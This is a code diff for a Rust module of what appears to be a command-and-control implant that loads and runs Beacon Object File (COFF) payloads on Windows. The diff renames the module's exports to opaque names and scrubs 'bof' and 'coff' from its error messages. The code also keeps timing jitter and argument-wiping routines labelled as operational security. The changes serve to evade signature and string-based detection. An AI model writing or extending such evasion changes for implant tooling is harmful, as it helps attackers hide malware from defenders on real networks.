@@ -21,7 +21,7 @@ fn runtime() -> &'static Runtime {
         tokio::runtime::Builder::new_current_thread()
             .enable_all()
             .build()
-            .expect("mod_bof rt")
+            .expect("plugin rt")
     })
 }
 
@@ -41,14 +41,16 @@ fn opsec_pre_exec() {
     std::thread::sleep(std::time::Duration::from_nanos(n as u64));
 }
 
-#[no_mangle]
+// ABI export names are intentionally neutral (x0..x3) — the agent resolves
+// them via pe_map/module_loader; see those resolvers before renaming.
+#[export_name = "x0"]
 pub extern "C" fn mod_init() -> i32 {
     let _ = runtime();
     opsec_pre_exec();
     0
 }
 
-#[no_mangle]
+#[export_name = "x1"]
 pub unsafe extern "C" fn mod_invoke(
     cmd_type: *const u8,
     cmd_type_len: u32,
@@ -69,7 +71,7 @@ pub unsafe extern "C" fn mod_invoke(
             out_ptr,
             out_len,
             "",
-            &format!("mod_bof: unsupported '{ct}'"),
+            &format!("plugin: unsupported '{ct}'"),
         );
     }
 
@@ -94,7 +96,7 @@ pub unsafe extern "C" fn mod_invoke(
         burn_bytes(&mut args);
         match result {
             Ok(out) => write_json(out_ptr, out_len, &out, ""),
-            Err(e) => write_json(out_ptr, out_len, "", &format!("bof: {e}")),
+            Err(e) => write_json(out_ptr, out_len, "", &format!("exec: {e}")),
         }
     }
     #[cfg(not(windows))]
@@ -103,7 +105,7 @@ pub unsafe extern "C" fn mod_invoke(
         let mut a = args;
         burn_bytes(&mut c);
         burn_bytes(&mut a);
-        write_json(out_ptr, out_len, "", "bof: windows only")
+        write_json(out_ptr, out_len, "", "unsupported on this platform")
     }
 }
 
@@ -113,7 +115,7 @@ fn burn_bytes(b: &mut [u8]) {
     }
 }
 
-#[no_mangle]
+#[export_name = "x2"]
 pub unsafe extern "C" fn mod_free(ptr: *mut u8, len: u32) {
     if ptr.is_null() || len == 0 {
         return;
@@ -121,7 +123,7 @@ pub unsafe extern "C" fn mod_free(ptr: *mut u8, len: u32) {
     let _ = Vec::from_raw_parts(ptr, len as usize, len as usize);
 }
 
-#[no_mangle]
+#[export_name = "x3"]
 pub extern "C" fn mod_shutdown() -> i32 {
     0
 }
@@ -132,26 +134,26 @@ fn parse_bof_payload(body: &[u8]) -> Result<(Vec<u8>, Vec<u8>), String> {
         let data_b64 = v
             .get("data")
             .and_then(|x| x.as_str())
-            .ok_or_else(|| "missing data (base64 COFF)".to_string())?;
+            .ok_or_else(|| "missing data field (base64)".to_string())?;
         let args_b64 = v.get("args").and_then(|x| x.as_str()).unwrap_or("");
         let coff = base64::engine::general_purpose::STANDARD
             .decode(data_b64.trim())
-            .map_err(|e| format!("bof data b64: {e}"))?;
+            .map_err(|e| format!("data decode: {e}"))?;
         let args = if args_b64.is_empty() {
             Vec::new()
         } else {
             base64::engine::general_purpose::STANDARD
                 .decode(args_b64.trim())
-                .map_err(|e| format!("args b64: {e}"))?
+                .map_err(|e| format!("args decode: {e}"))?
         };
         if coff.len() < 20 {
-            return Err("coff too small".into());
+            return Err("payload too small".into());
         }
         return Ok((coff, args));
     }
-    // Raw: entire body is COFF, no args
+    // Raw: entire body is the payload image, no args
     if body.len() < 20 {
-        return Err("raw coff too small".into());
+        return Err("raw payload too small".into());
     }
     Ok((body.to_vec(), Vec::new()))
 }
